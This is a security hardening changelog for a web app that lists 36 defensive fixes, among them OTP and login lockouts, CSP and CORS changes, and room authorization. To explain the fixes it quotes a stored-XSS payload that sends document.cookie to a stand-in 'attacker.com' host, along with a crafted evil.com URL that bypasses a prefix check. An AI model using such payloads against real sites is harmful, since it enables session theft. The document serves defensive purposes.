# Security Hardening — Change Log

**Last updated:** 2026-06-28  
**Scope:** Full red-team audit followed by three rounds of fixes across backend, frontend, database, and infrastructure layers.  
**Total changes:** 37 across 15 files + 2 new GitHub Actions config files.

---

## Files Changed

| File | Changes |
|---|---|
| `backend/models/Otp.js` | OTP attempt counter, resend cooldown, unique email index |
| `backend/models/Notification.js` | 90-day TTL auto-delete |
| `backend/models/LoginAttempt.js` | **New file** — per-email failed login tracker |
| `backend/models/User.js` | `storageUsedBytes` field for quota tracking |
| `backend/models/Project.js` | Missing indexes on hot query paths |
| `backend/models/Space.js` | Missing indexes on hot query paths |
| `backend/utils/livekit.js` | `removeParticipant()` for call eviction |
| `backend/server.js` | SESSION_SECRET enforcement, CORS guard, health check strip, Socket.IO room auth, session secret rotation, call membership check, audit_log TTL index |
| `backend/routes/api.js` | OTP brute force, login lockout, password reset, storage quota, invite race fix, notification flood cap, XSS/bypass/limit fixes |
| `backend/routes/admin.js` | Ghost collaborator cleanup, O(N) session scan fix, audit_log TTL field |
| `frontend/src/components/Sidebar.jsx` | Stored XSS fix in drag pill |
| `frontend/src/App.jsx` | PWA cache cleared on logout |

---

## Change Details

### 1. OTP Wrong-Guess Counter
**File:** `backend/models/Otp.js`, `backend/routes/api.js`

Added an `attempts` field to OTP documents. Each wrong guess increments it. At 5 wrong attempts the OTP is deleted and the user must request a fresh one.

**Before:** Attacker could brute-force a 6-digit OTP (1 million combinations) with no limit.  
**After:** Maximum 5 guesses per OTP, then it's destroyed.

---

### 2. OTP Resend Cooldown
**File:** `backend/models/Otp.js`, `backend/routes/api.js`

Added a `lastSentAt` field. A new OTP cannot be requested for the same email within 60 seconds of the last one.

**Before:** Attacker could spam a victim's inbox with thousands of OTP emails per minute.  
**After:** One OTP per email per 60 seconds.

---

### 3. Email Enumeration Removed from send_otp
**File:** `backend/routes/api.js`

The `send_otp` response no longer includes `exists: true/false` to indicate whether the email has an account.

**Before:** Anyone could check whether any email address is registered.  
**After:** Response is identical whether the account exists or not.

---

### 4. Per-Email Login Lockout
**File:** `backend/models/LoginAttempt.js` (new), `backend/routes/api.js`

A new `LoginAttempt` collection tracks consecutive failed password logins per email. After 10 failures the account is locked for 1 hour. The counter resets immediately on a successful login.

**Before:** Unlimited password guesses — brute force was unrestricted.  
**After:** 10 attempts allowed, then a 1-hour cooldown. TTL index auto-expires records after 1 hour.

---

### 5. Password Max Length Cap
**File:** `backend/routes/api.js`

Added `password.length > 256` guard in `register`, `reset_password_via_otp`, and `change_password`.

**Before:** A multi-megabyte password string would run through regex validation in O(N) before bcrypt truncated it, wasting CPU.  
**After:** Rejected immediately at 256+ characters.

---

### 6. Password Reset via OTP (new endpoint)
**File:** `backend/routes/api.js`

New pre-auth endpoint `reset_password_via_otp`: verifies email ownership via OTP, sets a new bcrypt-hashed password, then logs the user in immediately.

**Before:** Password users who forgot their password had no recovery path and were permanently locked out.  
**After:** Forgot-password flow that works identically to industry standard.

---

### 7. OTP / Google Account — Clear Error on Password Actions
**File:** `backend/routes/api.js`

`change_password` and `delete_account` now detect `OTP_AUTH_USER` / `GOOGLE_OAUTH_USER` password hashes and return a human-readable error instead of a silent failure or crash.

**Before:** Google and OTP users got confusing blank errors when trying to use password-based actions.  
**After:** Clear message: "Your account uses Google Sign-In and does not have a password."

---

### 8. SESSION_SECRET — Crash on Missing in Production
**File:** `backend/server.js`

If `SESSION_SECRET` is not set and `NODE_ENV=production`, the server now calls `process.exit(1)` with a clear fatal log. In development it still generates a temporary random secret with a warning.

**Before:** Missing secret silently generated a random one — every server restart invalidated all sessions.  
**After:** Production refuses to start without a real secret.

---

### 9. Zero-Downtime Session Secret Rotation
**File:** `backend/server.js`

Added `SESSION_SECRET_PREVIOUS` environment variable support. Both secrets are passed as an array to `express-session`, which signs new cookies with `[0]` and validates against all entries.

**How to rotate:**
1. Set `SESSION_SECRET_PREVIOUS` = current value of `SESSION_SECRET`
2. Set `SESSION_SECRET` = new value
3. Restart — existing sessions signed with the old key stay valid for their remaining TTL

**Before:** Rotating the secret key logged out every user simultaneously.  
**After:** Zero-downtime rotation — old sessions expire naturally over 7 days.

---

### 10. Ghost Collaborator Cleanup on Account Deletion
**File:** `backend/routes/admin.js`

Admin `delete_user` now runs `$pull` on all Project and Space documents to remove the deleted user from every collaborator list they appear on.

**Before:** Deleted users left phantom collaborator entries on other people's projects and spaces.  
**After:** Account deletion is fully cascading.

---

### 11. Session Invalidation on User Deletion and Revoke
**File:** `backend/routes/admin.js`

Both `delete_user` and `revoke` session endpoints now filter sessions at the MongoDB level using a regex on the serialized session JSON — instead of loading all sessions into Node.js memory and filtering in JavaScript.

**Before:** With millions of sessions, the old approach would load the entire sessions collection into RAM.  
**After:** MongoDB does the filtering; only matching session IDs are returned.

---

### 12. Socket.IO Room Access Control
**File:** `backend/server.js`

The `join_room` socket event handler is now `async` and queries the database to confirm the requesting user is an owner or collaborator before calling `socket.join()`.

**Before:** Any authenticated user could join any project's real-time update room by knowing or guessing the project ID.  
**After:** Membership is verified against the database on every room join attempt.

---

### 13. Collaborator Kicked from Active Call on Removal
**File:** `backend/utils/livekit.js`, `backend/routes/api.js`

Added `removeParticipant(roomName, participantIdentity)` using LiveKit's `RoomServiceClient`. Called from `remove_collaborator` and `remove_space_collaborator` when an active call is in progress.

**Before:** A removed collaborator kept their LiveKit call connection alive indefinitely.  
**After:** Removal from a project/space immediately evicts the user from any active call.

---

### 14. LiveKit Token — Membership Verified Before Issuance
**File:** `backend/server.js`

The `call:accept_join` socket handler now checks that `requesterId` is an owner or collaborator of the call's project/space before generating and sending a LiveKit JWT.

**Before:** A non-member with a valid account could send a join request; if the host clicked Accept, they received a real call token.  
**After:** Server verifies membership independently of the host's decision.

---

### 15. Per-User 1 GB Storage Quota
**File:** `backend/models/User.js`, `backend/routes/api.js`

Added `storageUsedBytes` to the User model. Every upload increments it; every deletion decrements it. Uploads exceeding the 1 GB limit are rejected before the presigned URL is issued or the file is written to disk.

**Before:** A single user could upload unlimited files, running up unbounded R2 storage bills.  
**After:** Hard cap at 1 GB per user across all file types.

---

### 16. R2 Upload Ownership Check
**File:** `backend/routes/api.js`

`get_upload_url` now verifies the requesting user is the owner of the project they're claiming to upload to, before issuing a presigned PUT URL.

**Before:** A user could request presigned upload URLs for other people's projects.  
**After:** Ownership confirmed before any presigned URL is generated.

---

### 17. Storage Counter Maintained on Upload and Delete
**File:** `backend/routes/api.js`

`confirm_upload` (R2), `upload` (disk), and `upload_task_file` (disk) increment `storageUsedBytes`. `delete_file` and `delete_task_file` decrement it by the stored file size.

**Before:** No tracking — quota checks could not be accurate without the counter.  
**After:** Accurate running total used for quota enforcement.

---

### 18. Invite Link Race Condition Fixed
**File:** `backend/routes/api.js`

`join_via_link` now uses a single atomic `findOneAndUpdate` with the invite token in the filter condition, rather than two separate find-then-update operations.

**Before:** Two users clicking the same invite link at the exact same moment could both be added as separate collaborator entries.  
**After:** Only one operation succeeds; the other hits a 404.

---

### 19. Old Invite Endpoint Deprecated
**File:** `backend/routes/api.js`

`invite_collaborator` (the old flow) now returns HTTP 410 Gone with `useInstead: 'send_collab_invite'`.

**Before:** Two invite flows existed, one less secure than the other.  
**After:** Old path is explicitly closed; callers are directed to the new path.

---

### 20. Notification Flood Prevention
**File:** `backend/routes/api.js`

`add_task_comment` now counts outgoing notifications from the sender in the last hour. If the running total would exceed 100, the notification batch is silently dropped (the comment still saves).

**Before:** A malicious collaborator could @mention every team member in thousands of comments, flooding everyone's notification inbox.  
**After:** Hard cap of 100 outgoing notifications per user per hour.

---

### 21. Restore Task Strips Invalid Assignees
**File:** `backend/routes/api.js`

`restore_task` now filters `assignees` against the current collaborator list before writing. Assignees who are no longer members of the project are removed.

**Before:** Restoring an archived task could re-add users who had since left the project as assignees.  
**After:** Assignee list is reconciled against current membership at restore time.

---

### 22. Download URL Strict Hostname Check
**File:** `backend/routes/api.js`

The download endpoint now uses `new URL(url).hostname` comparison instead of `url.startsWith(R2_PUBLIC_URL + '/')` prefix matching.

**Before:** A crafted URL like `https://real-r2-host.com.evil.com/file` would pass the prefix check.  
**After:** Exact hostname match required — no prefix bypass possible.

---

### 23. Feedback Response Strips Username for Non-Admins
**File:** `backend/routes/api.js`

`get_feedback` now only includes `userName` in the response when the requester is a `superadmin`.

**Before:** Regular users could see who submitted which feedback entries.  
**After:** Submitter identity is only visible to admins.

---

### 24. Duplicate / Copy Project Enforce the 200-Project Limit
**File:** `backend/routes/api.js`

Both `duplicate_project` and `copy_project` now run a `countDocuments` check before creating the new project.

**Before:** A user at the 200-project limit could click "Duplicate" in a loop to create thousands of projects, bypassing the cap entirely.  
**After:** The 200-project limit is enforced on every creation path.

---

### 25. Notification Auto-Delete After 90 Days
**File:** `backend/models/Notification.js`

Added `expires: 90 * 24 * 60 * 60` to the `createdAt` field — MongoDB TTL index auto-deletes documents after 90 days.

**Before:** Notifications accumulated forever, growing the database without bound.  
**After:** Auto-pruned after 90 days with no application code needed.

---

### 26. Audit Log Auto-Deletes After 1 Year
**File:** `backend/routes/admin.js`, `backend/server.js`

Every `audit_log` insert now includes an `expireAt` field set 365 days in the future. Server boot creates a TTL index on `expireAt` (idempotent — safe to run repeatedly).

**Before:** The admin audit log had no expiry — it would grow forever and eventually fill the database.  
**After:** Log entries automatically expire and are deleted after 1 year.

---

### 27. Health Check Strips Version and Environment Info
**File:** `backend/server.js`

`GET /api/health` now returns only `{ status, checks: { db } }`. Previously it included the git commit SHA and environment name.

**Before:** Attackers could read the exact deployed version and look up known CVEs for that release.  
**After:** Public health check reveals only database reachability.

---

### 28. CORS_ALLOW_ALL Blocked in Production
**File:** `backend/server.js`

If `CORS_ALLOW_ALL=true` is set while `NODE_ENV=production`, the server exits immediately with a fatal log.

**Before:** A misconfiguration could silently open the API to requests from any website on the internet.  
**After:** Production refuses to run with this flag set.

---

### 29. Stored XSS — Sidebar Drag Pill
**File:** `frontend/src/components/Sidebar.jsx`

The drag-and-drop ghost pill that appears when reordering projects or spaces was built using `innerHTML` with an unsanitized project/space title. Replaced with individual DOM element construction using `.textContent`.

**Before:** A collaborator could name a project `<img src=x onerror=fetch('attacker.com?d='+document.cookie)>`. When any user dragged that project, the XSS payload would execute in their browser, allowing the attacker to make authenticated API calls as the victim.  
**After:** All text in the drag pill is set via `textContent` — HTML is never interpreted.

---

### 30. Missing Database Indexes Added
**File:** `backend/models/Project.js`, `backend/models/Space.js`

Added indexes on:
- `Project.collaborators.userId` — queried on every single authenticated API call
- `Project.spaceId` — queried on space views and space deletion
- `Project.inviteToken` (sparse) — queried on invite link joins
- `Space.collaborators.userId` — queried on every authenticated API call
- `Space.inviteToken` (sparse) — queried on invite link joins

**Before:** Every authenticated request triggered a full collection scan. At scale (100K+ users), every API call would degrade linearly. An attacker making rapid requests could amplify the load into a DoS.  
**After:** Queries use indexed lookups — O(log N) instead of O(N). Critical for any meaningful user growth.

---

### 31. PWA Cache Cleared on Logout
**File:** `frontend/src/App.jsx`

`handleLogout` now calls `caches.keys()` and deletes every service worker cache entry before clearing React state.

**Before:** After logout, the Workbox service worker continued to serve cached API responses (projects, tasks, notifications) for up to 5 minutes. On a shared device, the next person could see the previous user's data without being logged in.  
**After:** All cached data is wiped the moment logout is triggered.

---

---

## Round 3 — Infrastructure & Remaining Fixes (2026-06-28)

### 32. CSP `unsafe-inline` Removed from script-src
**File:** `backend/server.js`

The only inline script in the entire app is the theme-detection snippet in `index.html`. Its SHA-256 hash was computed and added to the CSP allowlist. `unsafe-inline` was removed from `script-src`.

**Before:** Any injected `<script>` tag would execute — CSP gave zero XSS protection.  
**After:** Only scripts from `self`, Google Sign-In CDN, and the known theme snippet are allowed to run. Any injected script is blocked by the browser before it can execute.

```
# New CSP (script-src portion):
script-src 'self' 'sha256-ewqMvVQUaHXMsUBgLyvLLkarT9ybz5nbsiioiDY7AJc=' https://accounts.google.com
```

> **Note:** If the theme script in `index.html` is ever changed, the hash must be recomputed:
> ```
> node -e "const c=require('crypto'); console.log('sha256-'+c.createHash('sha256').update('<script content>').digest('base64'));"
> ```

---

### 33. Active Call State Moved from Memory to MongoDB
**File:** `backend/models/ActiveCall.js` (new), `backend/utils/livekit.js`, `backend/server.js`, `backend/routes/api.js`

Created a `ActiveCall` Mongoose model. All socket handlers and HTTP routes that previously read/wrote the in-process `Map` now use `await ActiveCall.findOne/create/findOneAndDelete`.

A 2-hour TTL index auto-deletes abandoned call records if the server crashes mid-call.

**Before:** If the server restarted while a call was active, the call entry vanished from memory — the host's "End Call" button stopped working, the room stayed alive indefinitely in LiveKit.  
**After:** Call state lives in MongoDB, survives restarts, and is visible to every server instance. Abandoned calls auto-clean after 2 hours.

---

### 34. Auth Rate Limiter Backed by MongoDB
**File:** `backend/routes/api.js`

Added a `MongoRateLimitStore` class that implements the `express-rate-limit` v8 store interface using the existing Mongoose connection. The `authLimiter` (login, register, OTP endpoints) now uses this store. No new packages required.

**Before:** Each server instance tracked its own in-memory counter. Two instances = double the allowed attempts. An attacker hitting two load-balanced instances could make 40 login attempts instead of 20.  
**After:** All instances share one counter in MongoDB. 20 attempts is 20 attempts regardless of how many servers are running.

> The general `apiLimiter` (500 req/15min for all other actions) intentionally stays in-memory — it's a volume guard, and the cost of a MongoDB round-trip on every API call outweighs the marginal security benefit at current scale.

---

### 35. Sentry Error Tracking Integrated
**File:** `backend/server.js`, `npm install @sentry/node`

Installed `@sentry/node`. Sentry initializes on startup only when `SENTRY_DSN` is set in environment variables. Replaced both `// Hook point: Sentry.captureException` stubs with real calls.

**Before:** Unhandled errors and rejected promises were logged to stdout and silently lost. Nobody was notified when the server crashed.  
**After:** Set `SENTRY_DSN` in the server environment and every error immediately appears in your Sentry dashboard with a full stack trace, request context, and user ID.

**To activate:** Sign up at sentry.io (free tier), create a Node.js project, copy the DSN, add `SENTRY_DSN=https://...` to the backend's environment variables.

---

### 36. GitHub Actions CI/CD Pipeline
**Files:** `.github/workflows/security.yml`, `.github/dependabot.yml`

Created two config files:

**`security.yml`** runs on every push and pull request:
- `npm audit --audit-level=high` on both backend and frontend
- `node --check` syntax validation on all backend files
- Weekly scheduled run every Monday to catch newly published CVEs

**`dependabot.yml`** opens automated pull requests every Monday for:
- Backend npm dependency updates
- Frontend npm dependency updates
- GitHub Actions version updates

**Before:** A critical CVE in Express, Mongoose, or Socket.IO could sit unpatched for months because nobody was watching.  
**After:** Any new high/critical CVE in a dependency fails the CI check the same day. Dependabot opens a PR to update it automatically.

---

## The One Thing That Still Needs Manual Action

### MongoDB Atlas — Least-Privilege Database User

This cannot be done from application code. It requires the MongoDB Atlas dashboard.

**The problem:** The app currently connects to MongoDB with a single user that has full read/write/delete access to everything. If the connection string leaks, an attacker has complete access to all user data.

**The fix — 30 minutes in Atlas:**

1. Log into [cloud.mongodb.com](https://cloud.mongodb.com)
2. Go to **Database Access** → **Add New Database User**
3. Create a user named `brainjot-app` with:
   - Role: **Read and write to any database** on the `brainjot` database only
   - No admin, no Atlas admin, no cluster management
4. Create a second user named `brainjot-readonly` (for future analytics/reporting use):
   - Role: **Only read any database** on the `brainjot` database
5. Update the `MONGODB_URI` in the backend's environment to use `brainjot-app` credentials
6. Delete or disable the old overprivileged user
7. Go to **Network Access** → confirm only the server's IP is allowed (not `0.0.0.0/0`)

**Result:** Even if the connection string leaks, the attacker can only read/write data — they cannot drop collections, delete indexes, or access other databases on the cluster.
